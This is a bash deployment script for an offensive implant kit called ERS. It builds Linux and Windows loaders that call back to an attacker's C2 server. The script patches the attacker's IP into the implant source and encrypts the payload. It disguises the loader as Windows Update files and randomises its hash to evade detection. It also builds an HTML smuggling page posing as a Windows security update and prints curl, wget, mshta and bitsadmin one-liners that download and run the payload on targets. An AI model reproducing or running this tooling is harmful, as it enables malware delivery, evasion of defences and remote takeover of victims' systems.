#!/bin/bash
# ═══════════════════════════════════════════════════════════════════
#  ERS Automated Deploy — Fully Automated A-to-Z
# ═══════════════════════════════════════════════════════════════════
#
#  Usage:
#    bash deploy.sh                          # interactive menu
#    bash deploy.sh --linux                  # build + serve Linux loader
#    bash deploy.sh --windows                # build + serve Windows loader
#    bash deploy.sh --both                   # build + serve both
#    bash deploy.sh --both --port 9090       # custom serve port
#    bash deploy.sh --both --c2port 4443     # custom C2 callback port
#    bash deploy.sh --both --lhost 10.10.14.5  # manual attacker IP
#
#  Everything is automated:
#    - Auto-detects attacker IP (tun0 → eth0 → wlan0)
#    - Auto-patches C2 address into implant source code
#    - Auto-generates TLS certificates if missing
#    - Builds implant → encrypts → builds loader → serves HTTP
#    - Starts WSS listener for callback
#    - Prints ready-to-paste one-liners
#
#  On target: just double-click the .exe or run the one-liner. Done.

set -e

# ── Config ──────────────────────────────────────────────────────────
ROOT="$(cd "$(dirname "$0")" && pwd)"
SERVE_PORT="${SERVE_PORT:-8080}"
C2_PORT="${C2_PORT:-4443}"
BUILD_LINUX=false
BUILD_WINDOWS=false
INTERACTIVE=true
LHOST=""

# ── Parse args ──────────────────────────────────────────────────────
while [[ $# -gt 0 ]]; do
    case "$1" in
        --linux)    BUILD_LINUX=true; INTERACTIVE=false ;;
        --windows)  BUILD_WINDOWS=true; INTERACTIVE=false ;;
        --both)     BUILD_LINUX=true; BUILD_WINDOWS=true; INTERACTIVE=false ;;
        --port)     SERVE_PORT="$2"; shift ;;
        --c2port)   C2_PORT="$2"; shift ;;
        --lhost)    LHOST="$2"; shift ;;
        *)          echo "[!] Unknown arg: $1"; exit 1 ;;
    esac
    shift
done

# ── Fix: disable IPv6 to prevent cargo connection failures ─────────
sudo sysctl -w net.ipv6.conf.all.disable_ipv6=1 >/dev/null 2>&1 || true
export CARGO_HTTP_CHECK_REVOKE=false
export CARGO_NET_GIT_FETCH_WITH_CLI=true

# ── Detect attacker IP ─────────────────────────────────────────────
detect_ip() {
    if [ -n "$LHOST" ]; then
        echo "$LHOST"
        return
    fi
    for iface in tun0 eth0 wlan0; do
        local ip=$(ip -4 addr show "$iface" 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
        if [ -n "$ip" ]; then echo "$ip"; return; fi
    done
    hostname -I 2>/dev/null | awk '{print $1}'
}

ATTACKER_IP=$(detect_ip)

if [ -z "$ATTACKER_IP" ]; then
    echo "[!] Could not detect IP. Use --lhost YOUR_IP"
    exit 1
fi

# ── Colors ──────────────────────────────────────────────────────────
R='\033[0;31m'  G='\033[0;32m'  Y='\033[0;33m'  B='\033[0;34m'
C='\033[0;36m'  W='\033[1;37m'  D='\033[0;90m'  N='\033[0m'

banner() {
    echo -e "${C}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║       ERS Automated Deploy System v2.0        ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${N}"
}

# ── Interactive menu ────────────────────────────────────────────────
if $INTERACTIVE; then
    banner
    echo -e "  ${W}Attacker IP:${N}  ${G}${ATTACKER_IP}${N}  ${D}(auto-detected, override with --lhost)${N}"
    echo -e "  ${W}C2 port:${N}      ${G}${C2_PORT}${N}"
    echo -e "  ${W}Serve port:${N}   ${G}${SERVE_PORT}${N}"
    echo ""
    echo -e "  ${W}[1]${N} Deploy Linux loader"
    echo -e "  ${W}[2]${N} Deploy Windows loader"
    echo -e "  ${W}[3]${N} Deploy both"
    echo ""
    read -rp "  Select [1-3]: " choice
    case "$choice" in
        1) BUILD_LINUX=true ;;
        2) BUILD_WINDOWS=true ;;
        3) BUILD_LINUX=true; BUILD_WINDOWS=true ;;
        *) echo "[!] Invalid choice"; exit 1 ;;
    esac
    echo ""
fi

# ── Staging directory ──────────────────────────────────────────────
STAGE_DIR="$ROOT/.staging"
mkdir -p "$STAGE_DIR"

# ── Auto-generate TLS certificates ─────────────────────────────────
generate_certs() {
    local dir="$1"
    if [ -f "$dir/cert.pem" ] && [ -f "$dir/key.pem" ]; then
        echo -e "  ${D}TLS certs already exist in $dir${N}"
        return
    fi
    echo -e "  ${Y}[*]${N} Generating TLS certificates..."
    openssl req -x509 -newkey rsa:2048 \
        -keyout "$dir/key.pem" -out "$dir/cert.pem" \
        -days 365 -nodes -subj "/CN=$ATTACKER_IP" 2>/dev/null
    echo -e "  ${G}[+]${N} TLS certs generated: $dir/cert.pem"
}

# ── Auto-patch C2 IP in implant source ──────────────────────────────
patch_c2_windows() {
    local src="$ROOT/ERS-W/src/main.rs"
    local ip_padded="$ATTACKER_IP"

    # Current line looks like: const ENC_C2_HOST: [u8; N] = xor_encode(b"192.168.0.108  ");
    # We need to match the array size (N) to the new IP length (padded with spaces)
    local current_ip=$(grep 'ENC_C2_HOST' "$src" | grep -oP 'b"[^"]*"' | tr -d 'b"')
    local current_len=${#current_ip}

    # Pad new IP with spaces to match current length
    while [ ${#ip_padded} -lt "$current_len" ]; do
        ip_padded="$ip_padded "
    done

    # If new IP is longer than current, we need to update the array size too
    local new_len=${#ip_padded}

    sed -i "s|const ENC_C2_HOST: \[u8; [0-9]*\] = xor_encode(b\"[^\"]*\");|const ENC_C2_HOST: [u8; $new_len] = xor_encode(b\"$ip_padded\");|" "$src"
    sed -i "s|const ENC_C2_PORT: \[u8; [0-9]*\] = xor_encode(b\"[^\"]*\");|const ENC_C2_PORT: [u8; ${#C2_PORT}] = xor_encode(b\"$C2_PORT\");|" "$src"

    echo -e "  ${G}[+]${N} Patched ERS-W C2: ${ATTACKER_IP}:${C2_PORT}"
}

patch_c2_linux() {
    local src="$ROOT/ERS/src/main.rs"

    # Linux uses .onion by default, but for direct mode we patch ENC_DEFAULT_IP
    # Check if PROXY_MODE is 0 (direct connection)
    local proxy_mode=$(grep 'const PROXY_MODE' "$src" | grep -oP '\d+')

    if [ "$proxy_mode" = "0" ]; then
        # Direct mode — patch the default IP to our attacker IP
        local current_ip=$(grep 'ENC_DEFAULT_IP' "$src" | grep -oP 'b"[^"]*"' | tr -d 'b"')
        local current_len=${#current_ip}
        local ip_padded="$ATTACKER_IP"

        while [ ${#ip_padded} -lt "$current_len" ]; do
            ip_padded="$ip_padded "
        done
        local new_len=${#ip_padded}

        sed -i "s|const ENC_DEFAULT_IP: \[u8; [0-9]*\] = xor_encode(b\"[^\"]*\");|const ENC_DEFAULT_IP: [u8; $new_len] = xor_encode(b\"$ip_padded\");|" "$src"
        sed -i "s|const ENC_DEFAULT_PORT: \[u8; [0-9]*\] = xor_encode(b\"[^\"]*\");|const ENC_DEFAULT_PORT: [u8; ${#C2_PORT}] = xor_encode(b\"$C2_PORT\");|" "$src"
        echo -e "  ${G}[+]${N} Patched ERS C2: ${ATTACKER_IP}:${C2_PORT} (direct mode)"
    else
        echo -e "  ${Y}[*]${N} ERS is in proxy/Tor mode (mode $proxy_mode) — IP not patched"
    fi
}

# ── Build Linux ─────────────────────────────────────────────────────
build_linux() {
    echo -e "${W}══════════════════════════════════════════${N}"
    echo -e "${G}  Building Linux Loader${N}"
    echo -e "${W}══════════════════════════════════════════${N}"

    # Auto-generate TLS certs
    generate_certs "$ROOT/ERS"

    # Auto-patch C2 IP
    patch_c2_linux

    cd "$ROOT/ERS"

    # Always rebuild implant (IP may have changed)
    echo -e "  ${Y}[*]${N} Building ERS implant..."
    cargo build --release 2>&1 | tail -3
    # Find the binary name
    local BIN=$(find target/release -maxdepth 1 -type f -executable ! -name '*.d' | head -1)
    if [ -n "$BIN" ]; then
        cp "$BIN" implant
    fi

    if [ ! -f implant ]; then
        echo -e "  ${R}[!]${N} Implant build failed"
        return 1
    fi

    echo -e "  ${G}[+]${N} Implant: $(du -h implant | cut -f1)"

    # Encrypt + build loader
    cd "$ROOT/ERS/loader"
    echo -e "  ${Y}[*]${N} Encrypting payload (fresh hash)..."
    python3 encrypt_payload.py ../implant

    echo -e "  ${Y}[*]${N} Compiling loader..."
    RUSTFLAGS="--remap-path-prefix=$HOME=. --remap-path-prefix=$(pwd)=." \
      cargo build --release 2>&1 | tail -3

    cp target/release/ers-loader "$STAGE_DIR/update"
    chmod +x "$STAGE_DIR/update"

    # Scrub build paths
    python3 -c "
data = bytearray(open('$STAGE_DIR/update','rb').read())
for old, new in [(b'/rustc/',b'\x00'*7),(b'/home/',b'\x00'*6),(b'.cargo/registry/',b'\x00'*16)]:
    idx = 0
    while True:
        idx = data.find(old, idx)
        if idx == -1: break
        data[idx:idx+len(old)] = new
        idx += len(new)
open('$STAGE_DIR/update','wb').write(data)
" 2>/dev/null

    echo -e "  ${G}[+]${N} Linux loader ready: $(du -h "$STAGE_DIR/update" | cut -f1)"
}

# ── Build HTML Smuggling page ───────────────────────────────────────
build_smuggle() {
    local loader="$STAGE_DIR/WUAgent.exe"
    local template="$ROOT/ERS-W/smuggle_template.html"
    local output="$STAGE_DIR/update.html"

    if [ ! -f "$loader" ]; then
        echo -e "  ${Y}[*]${N} Skipping HTML smuggling — no loader built yet"
        return
    fi
    if [ ! -f "$template" ]; then
        echo -e "  ${Y}[*]${N} Skipping HTML smuggling — no template found"
        return
    fi

    echo -e "  ${Y}[*]${N} Building HTML smuggling page..."

    # Base64 encode the loader and inject into template
    python3 -c "
import base64, sys
payload = open('$loader', 'rb').read()
b64 = base64.b64encode(payload).decode()
template = open('$template', 'r').read()
result = template.replace('%%PAYLOAD_B64%%', b64)
open('$output', 'w').write(result)
print(f'  Payload: {len(payload)} bytes -> Base64: {len(b64)} bytes -> HTML: {len(result)} bytes')
"
    echo -e "  ${G}[+]${N} HTML smuggling page ready: $(du -h "$output" | cut -f1)"
}

# ── Build Windows ───────────────────────────────────────────────────
build_windows() {
    echo -e "${W}══════════════════════════════════════════${N}"
    echo -e "${G}  Building Windows Loader${N}"
    echo -e "${W}══════════════════════════════════════════${N}"

    # Auto-generate TLS certs
    generate_certs "$ROOT/ERS-W"

    # Auto-patch C2 IP
    patch_c2_windows

    cd "$ROOT/ERS-W"

    # Always rebuild implant (IP may have changed)
    echo -e "  ${Y}[*]${N} Building ERS-W implant..."
    cargo build --release --target x86_64-pc-windows-gnu 2>&1 | tail -3
    cp target/x86_64-pc-windows-gnu/release/*.exe ers-w.exe 2>/dev/null || true

    if [ ! -f ers-w.exe ]; then
        echo -e "  ${R}[!]${N} Implant build failed"
        return 1
    fi

    echo -e "  ${G}[+]${N} Implant: $(du -h ers-w.exe | cut -f1)"

    # Encrypt + build loader
    cd "$ROOT/ERS-W/loader"
    echo -e "  ${Y}[*]${N} Encrypting payload (fresh hash)..."
    python3 encrypt_payload.py ../ers-w.exe

    echo -e "  ${Y}[*]${N} Cross-compiling loader for Windows..."
    RUSTFLAGS="--remap-path-prefix=$HOME=. --remap-path-prefix=$(pwd)=." \
      cargo build --release --target x86_64-pc-windows-gnu 2>&1 | tail -3

    cp target/x86_64-pc-windows-gnu/release/ers-w-loader.exe "$STAGE_DIR/WUAgent.exe"

    # Scrub build paths
    python3 -c "
data = bytearray(open('$STAGE_DIR/WUAgent.exe','rb').read())
for old, new in [(b'/rustc/',b'\x00'*7),(b'/home/',b'\x00'*6),(b'.cargo/registry/',b'\x00'*16)]:
    idx = 0
    while True:
        idx = data.find(old, idx)
        if idx == -1: break
        data[idx:idx+len(old)] = new
        idx += len(new)
open('$STAGE_DIR/WUAgent.exe','wb').write(data)
" 2>/dev/null

    # Append random bytes to PE overlay (unique hash per build, doesn't affect execution)
    dd if=/dev/urandom bs=1 count=$((RANDOM % 512 + 256)) >> "$STAGE_DIR/WUAgent.exe" 2>/dev/null
    echo -e "  ${G}[+]${N} Windows loader ready: $(du -h "$STAGE_DIR/WUAgent.exe" | cut -f1) (unique hash)"

    # Build HTML smuggling page
    build_smuggle
}

# ── Generate one-liners ────────────────────────────────────────────
print_oneliners() {
    echo ""
    echo -e "${C}══════════════════════════════════════════════════${N}"
    echo -e "${W}  TARGET ONE-LINERS  ${D}(copy-paste to target)${N}"
    echo -e "${C}══════════════════════════════════════════════════${N}"

    if [ -f "$STAGE_DIR/update" ]; then
        echo ""
        echo -e "  ${G}── Linux ──────────────────────────────────────${N}"
        echo ""
        echo -e "  ${W}curl:${N}"
        echo -e "  ${Y}curl -sk http://${ATTACKER_IP}:${SERVE_PORT}/update -o /tmp/.dbus-helper && chmod +x /tmp/.dbus-helper && /tmp/.dbus-helper &${N}"
        echo ""
        echo -e "  ${W}wget:${N}"
        echo -e "  ${Y}wget -q http://${ATTACKER_IP}:${SERVE_PORT}/update -O /tmp/.dbus-helper && chmod +x /tmp/.dbus-helper && /tmp/.dbus-helper &${N}"
        echo ""
        echo -e "  ${W}Download + run + self-delete:${N}"
        echo -e "  ${Y}cd /tmp && curl -sk http://${ATTACKER_IP}:${SERVE_PORT}/update -o .u && chmod +x .u && (nohup ./.u &>/dev/null &) && sleep 1 && rm -f .u${N}"
        echo ""
    fi

    if [ -f "$STAGE_DIR/WUAgent.exe" ]; then
        echo ""
        echo -e "  ${G}── Windows ────────────────────────────────────${N}"
        echo ""
        echo -e "  ${W}Browser open (stealthiest — no download tool flagged):${N}"
        echo -e "  ${Y}start http://${ATTACKER_IP}:${SERVE_PORT}/update.html${N}"
        echo -e "  ${D}  Opens default browser → HTML smuggling assembles exe client-side${N}"
        echo ""
        echo -e "  ${W}mshta (Windows-native, no curl/certutil/AMSI):${N}"
        echo -e "  ${Y}mshta http://${ATTACKER_IP}:${SERVE_PORT}/update.html${N}"
        echo -e "  ${D}  Uses built-in mshta.exe to render page + trigger download${N}"
        echo ""
        echo -e "  ${W}CMD + curl (fallback):${N}"
        echo -e "  ${Y}cmd /c curl -s -o %TEMP%\\WUAgent.exe http://${ATTACKER_IP}:${SERVE_PORT}/WUAgent.exe && start /b %TEMP%\\WUAgent.exe${N}"
        echo ""
        echo -e "  ${W}CMD + bitsadmin (BITS service — looks like Windows Update):${N}"
        echo -e "  ${Y}bitsadmin /transfer WUUpdate /download /priority high http://${ATTACKER_IP}:${SERVE_PORT}/WUAgent.exe %TEMP%\\WUAgent.exe && start /b %TEMP%\\WUAgent.exe${N}"
        echo ""

        if [ -f "$STAGE_DIR/update.html" ]; then
            echo -e "  ${G}── HTML Smuggling link (send to victim) ───────${N}"
            echo ""
            echo -e "  ${Y}http://${ATTACKER_IP}:${SERVE_PORT}/update.html${N}"
            echo ""
            echo -e "  ${D}Victim sees: 'Windows Security Update KB5034441' page${N}"
            echo -e "  ${D}Exe auto-downloads via JS blob → no network file transfer to flag${N}"
            echo ""
        fi
    fi

    echo -e "  ${D}─────────────────────────────────────────────────${N}"
    echo -e "  ${W}HTTP Server:${N} http://${ATTACKER_IP}:${SERVE_PORT}/"
    echo -e "  ${W}C2 Listener:${N} wss://${ATTACKER_IP}:${C2_PORT}/"
    echo ""
}

# ── Detect terminal emulator ───────────────────────────────────────
detect_terminal() {
    for term in kitty gnome-terminal xfce4-terminal konsole xterm; do
        if command -v "$term" &>/dev/null; then
            echo "$term"
            return
        fi
    done
    echo ""
}

TERM_EMU=$(detect_terminal)

# Helper: open a command in a new terminal window with a title
open_in_terminal() {
    local title="$1"
    local cmd="$2"

    case "$TERM_EMU" in
        kitty)
            kitty --title "$title" --detach bash -c "$cmd" ;;
        gnome-terminal)
            gnome-terminal --title="$title" -- bash -c "$cmd" ;;
        xfce4-terminal)
            xfce4-terminal --title="$title" -e "bash -c '$cmd'" ;;
        konsole)
            konsole --new-tab -p tabtitle="$title" -e bash -c "$cmd" ;;
        xterm)
            xterm -T "$title" -e bash -c "$cmd" & ;;
        *)
            echo -e "  ${Y}[!]${N} No terminal emulator found — running in background"
            bash -c "$cmd" &
            ;;
    esac
}

# ── Start listener in THIS terminal (foreground) ──────────────────
start_listener_foreground() {
    local listener_dir=""
    if $BUILD_WINDOWS || [ -f "$STAGE_DIR/WUAgent.exe" ]; then
        listener_dir="$ROOT/ERS-W"
    elif $BUILD_LINUX || [ -f "$STAGE_DIR/update" ]; then
        listener_dir="$ROOT/ERS"
    fi

    if [ -z "$listener_dir" ] || [ ! -f "$listener_dir/listener.py" ]; then
        echo -e "  ${Y}[*]${N} No listener.py found, skipping"
        return
    fi

    generate_certs "$listener_dir"

    echo -e "${C}══════════════════════════════════════${N}"
    echo -e "${W}  C2 Listener — wss://0.0.0.0:${C2_PORT}${N}"
    echo -e "${C}══════════════════════════════════════${N}"
    echo ""

    cd "$listener_dir"
    python3 listener.py ${C2_PORT}
}

# ── Start HTTP server in new terminal ──────────────────────────────
start_http_server() {
    echo -e "  ${G}[+]${N} Starting HTTP server on port ${SERVE_PORT} in new terminal..."

    open_in_terminal "ERS HTTP Server [:${SERVE_PORT}]" \
        "cd '$STAGE_DIR' && echo -e '\033[0;36m══════════════════════════════════════\033[0m' && echo -e '\033[1;37m  HTTP Server — http://0.0.0.0:${SERVE_PORT}\033[0m' && echo -e '\033[0;36m══════════════════════════════════════\033[0m' && echo '' && ls -lh . && echo '' && python3 -c \"
import http.server, socketserver, sys, signal
from datetime import datetime

signal.signal(signal.SIGPIPE, signal.SIG_DFL)

class Handler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, fmt, *args):
        ts = datetime.now().strftime('%H:%M:%S')
        client = self.client_address[0]
        msg = fmt % args
        if '200' in msg:
            print(f'  \033[0;32m[{ts}]\033[0m {client} => {msg}')
        elif '404' in msg:
            print(f'  \033[0;31m[{ts}]\033[0m {client} => {msg}')
        else:
            print(f'  \033[0;90m[{ts}]\033[0m {client} => {msg}')
        sys.stdout.flush()

    def end_headers(self):
        if not self.path.endswith('.html'):
            self.send_header('Content-Disposition', 'attachment')
        self.send_header('Cache-Control', 'no-store')
        super().end_headers()

    def handle_one_request(self):
        try:
            super().handle_one_request()
        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError):
            pass

    def finish(self):
        try:
            super().finish()
        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError):
            pass

class QuietServer(socketserver.TCPServer):
    allow_reuse_address = True
    def handle_error(self, request, client_address):
        exc = sys.exc_info()[1]
        if isinstance(exc, (BrokenPipeError, ConnectionResetError, ConnectionAbortedError)):
            ts = datetime.now().strftime('%H:%M:%S')
            print(f'  \033[0;33m[{ts}]\033[0m {client_address[0]} => client disconnected (partial download)')
            sys.stdout.flush()
        else:
            super().handle_error(request, client_address)

PORT = int(sys.argv[1])
print(f'  Serving on http://0.0.0.0:{PORT}')
print()
with QuietServer(('0.0.0.0', PORT), Handler) as httpd:
    httpd.serve_forever()
\" ${SERVE_PORT}; echo ''; echo '[!] Server exited. Press Enter to close.'; read"

    sleep 0.5
    echo -e "  ${G}[+]${N} HTTP server launched in separate terminal"
}

# ── Serve files ─────────────────────────────────────────────────────
serve_files() {
    echo ""
    echo -e "${C}══════════════════════════════════════════════════${N}"
    echo -e "${W}  Launching Servers${N}"
    echo -e "${C}══════════════════════════════════════════════════${N}"
    echo ""

    ls -lh "$STAGE_DIR/" 2>/dev/null
    echo ""

    # Kill any existing server on the ports
    fuser -k "${SERVE_PORT}/tcp" 2>/dev/null || true
    fuser -k "${C2_PORT}/tcp" 2>/dev/null || true
    sleep 0.5

    # Launch HTTP server in a NEW terminal
    start_http_server

    echo ""
    print_oneliners

    echo ""
    echo -e "  ${G}[+]${N} HTTP server running in separate terminal"
    echo -e "  ${G}[+]${N} Listener starting below in this terminal..."
    echo ""

    # Run listener in THIS terminal (foreground, blocks)
    start_listener_foreground
}

# ── Cleanup on exit ────────────────────────────────────────────────
cleanup() {
    echo ""
    echo -e "${G}[+]${N} Deploy complete. HTTP server in separate terminal, listener exited."
}
trap cleanup EXIT

# ── Main ────────────────────────────────────────────────────────────
banner

echo -e "  ${W}Attacker IP:${N}  ${G}${ATTACKER_IP}${N}"
echo -e "  ${W}C2 port:${N}      ${G}${C2_PORT}${N}"
echo -e "  ${W}HTTP port:${N}    ${G}${SERVE_PORT}${N}"
echo ""

$BUILD_LINUX && build_linux
$BUILD_WINDOWS && build_windows

if ls "$STAGE_DIR"/* &>/dev/null; then
    serve_files
else
    echo -e "${R}[!]${N} Nothing to serve."
    echo -e "${Y}[*]${N} Run with --linux, --windows, or --both"
    exit 1
fi
